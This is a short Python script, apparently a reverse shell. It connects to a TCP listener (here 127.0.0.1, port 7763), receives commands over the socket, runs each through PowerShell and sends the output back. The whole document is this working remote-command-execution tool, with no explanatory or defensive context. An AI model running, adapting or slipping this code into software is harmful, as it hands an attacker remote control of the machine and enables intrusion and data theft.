import subprocess, socket

ip = "127.0.0.1"
port = 7763

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((ip, port))

while True:
    c = s.recv(1024).decode('ascii')
    print("powershell -Command \""+c+"\"")
    out = subprocess.getoutput("powershell -Command \""+c+"\"")
    print(out)
    s.sendall(out.encode('ascii'))